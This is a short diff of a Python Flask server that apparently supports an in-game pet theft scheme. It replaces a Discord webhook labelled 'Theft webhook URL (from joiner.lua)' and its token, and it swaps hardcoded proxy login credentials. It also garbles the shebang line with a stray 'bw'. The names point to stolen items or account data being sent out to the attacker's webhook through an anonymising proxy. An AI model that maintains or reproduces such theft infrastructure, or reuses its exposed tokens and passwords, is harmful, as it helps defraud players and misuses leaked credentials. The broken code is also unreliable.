@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+bw#!/usr/bin/env python3
 import os
 import re
 import requests
@@ -20,7 +20,7 @@ logging.basicConfig(
 app = Flask(__name__)
 
 # Theft webhook URL (from joiner.lua)
-THEFT_WEBHOOK_URL = "https://discord.com/api/webhooks/1463242651422953616/yCdk9-DmnpVTs1zUdaCD77c3OqzaRmZwP7NYbh4jyEGbs8SL0z1d08_n0A3v4I7yqpvT"
+THEFT_WEBHOOK_URL = "https://discord.com/api/webhooks/1472446663753990298/E4BaXQNAdcwQ-jBPrDDSbwtSf6RBgWHKsuMD7RBt7xDDpGhWMact2xAWRhfqj9lguYMt"
 
 # Pet thumbnail images (matching joiner.lua)
 PET_IMAGES = {
@@ -189,7 +189,7 @@ CACHE_CLEAR_INTERVAL = 600  # ✅ Increased from 5 to 10 minutes
 
 # Hardcoded proxy configuration
 PROXY_HOST = 'eu.nettify.xyz:8080'
-PROXY_AUTH = 'nmjqal:bchgvwgp'
+PROXY_AUTH = 'vx9921:20hmvfzy'
 
 def get_proxy_dict():
     """Get proxy dict for requests - hardcoded proxy"""
